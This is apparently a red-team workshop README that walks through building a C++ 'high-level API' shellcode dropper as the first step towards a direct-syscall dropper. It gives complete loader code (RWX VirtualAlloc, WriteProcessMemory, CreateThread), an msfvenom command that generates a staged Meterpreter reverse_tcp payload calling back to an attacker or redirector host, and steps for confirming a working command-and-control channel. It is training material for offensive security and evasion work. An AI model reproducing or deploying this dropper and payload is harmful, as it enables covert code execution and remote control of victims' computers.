## Introduction
In this exercise, we want to take the first step towards creating our own direct system call dropper. But to understand the principle of a legitimate
sysall itself, we start by creating a high-level API (HLA) shellcode dropper based on Windows APIs, which will serve as our reference for later modifications. The technical functionality of the high level API is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the high level API dropper into a direct system call dropper. In the HLA dropper we use the following Windows APIs: 
- VirtualAlloc
- WriteProcessMemory
- CreateThread
- WaitForSingleObject



## Workshop tasks
- Create a new C++ POC in Visual Studio 2019 and use the provided code for the HLA dropper
- Create staged x64 meterpreter shellcode with msfvenom and copy it into the C++ HLA Dropper POC. 
- Compile the HLA Dropper as release or debug x64 
- Create and run a staged x64 meterpreter listener with msfconsole
- Run your compiled .exe and check if a stable command and control channel opens 
- Use the Visual Studio dumpbin tool to verify that all used Windows APIs are correctly imported by kernel32.dll. 
- Use the API Monitor tool to check the transition from the used Windows APIs to the corresponding native APIs. 
- Use x64 dbg and check where the syscall execution of each used Native API comes from ? Module? Location? 


### Visual Studio 
The first step is to create a new C++ project in Visual Studio by following the steps below. 

<p align="center">
<img width="652" alt="image" src="https://user-images.githubusercontent.com/50073731/235356344-c14f9123-751c-462c-a610-50c7156f93f9.png">
</p>

The easiest way is to create a new console app project and then delete the default hello world text in main.cpp. 

<p align="center">
<img width="640" alt="image" src="https://user-images.githubusercontent.com/50073731/235357092-5fd2e873-6732-4b37-a69d-38a281953b2e.png">
<img width="645" alt="image" src="https://user-images.githubusercontent.com/50073731/235357228-940ec56c-7565-44b8-8b6a-01a74ab15e1d.png">
</p>

The following code can be used for the high_level_dropper.cpp
```
#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}

int main() {
    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);

    // Return 0 as the main function exit code
    return 0;
}
```


### Meterpreter Shellcode
In this step, we will create our shellcode for the high-level API dropper poc with msfvenom in Kali Linux. To do this, we use the following command and 
create x64 staged meterpreter shellcode.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="537" alt="image" src="https://user-images.githubusercontent.com/50073731/235357931-6db9c220-f767-43a7-8952-93505a254e51.png">
</p>


